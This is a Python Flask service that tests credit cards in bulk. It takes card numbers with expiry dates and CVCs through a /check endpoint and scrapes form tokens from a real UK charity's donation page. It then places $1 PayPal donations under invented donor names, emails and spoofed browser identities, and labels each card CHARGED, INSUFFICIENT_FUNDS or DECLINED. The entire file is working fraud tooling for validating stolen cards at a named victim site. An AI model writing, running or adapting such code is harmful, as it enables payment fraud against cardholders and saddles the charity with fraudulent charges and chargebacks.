import requests, re, base64, json, random, os
from flask import Flask, request, jsonify
from user_agent import generate_user_agent

app = Flask(__name__)

def look(cc_line):
    try:
        number, month, year, cvc = [x.strip() for x in cc_line.split("|")]
        month = month.zfill(2)
        year = year[2:] if len(year) == 4 else year
    except: 
        return "INVALID_FORMAT"

    first = random.choice(["James", "Emma", "Michael", "Sophia", "William"])
    last  = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
    
    s = requests.Session()
    user = generate_user_agent()
    
    try:
        resp = s.get("https://stockportmecfs.co.uk/donate-now/", headers={'User-Agent': user}, timeout=15)
        text = resp.text
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', text).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', text).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', text).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8')).group(1)
        
        payload_create = {
            'give-form-id-prefix': form_prefix, 'give-form-id': form_id, 'give-form-hash': form_hash,
            'give-amount': "1.00", 'payment-mode': 'paypal-commerce', 'give_first': first,
            'give_last': last, 'give_email': email, 'give-gateway': 'paypal-commerce'
        }
        
        resp_create = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", 
                             data=payload_create, headers={'User-Agent': user}, timeout=15)
        order_id = resp_create.json()['data']['id']
        
        payload_confirm = {
            "payment_source": {"card": {"number": number, "expiry": f"20{year}-{month}", "security_code": cvc}}
        }
        
        s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source", 
               json=payload_confirm, headers={'Authorization': f"Bearer {access_token}", 'Content-Type': 'application/json'}, timeout=15)
        
        resp_approve = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}", 
                              data=payload_create, headers={'User-Agent': user}, timeout=15)
        
        res_text = resp_approve.text.lower()
        if any(x in res_text for x in ['thank', 'thanks', 'true']): return "CHARGED"
        if 'insufficient_funds' in res_text: return "INSUFFICIENT_FUNDS"
        return "DECLINED"
    except Exception as e:
        return f"ERROR: {str(e)}"

@app.route('/')
def home():
    return jsonify({"status": "API Online", "usage": "/check?card=cc|mm|yy|cvv"})

@app.route('/check')
def check_card():
    card_data = request.args.get('card')
    if not card_data:
        return jsonify({"error": "No card data provided"}), 400
    result = look(card_data)
    return jsonify({"card": card_data, "result": result})

if __name__ == "__main__":
    # Penting: Railway memberikan port secara dinamis melalui environment variable
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
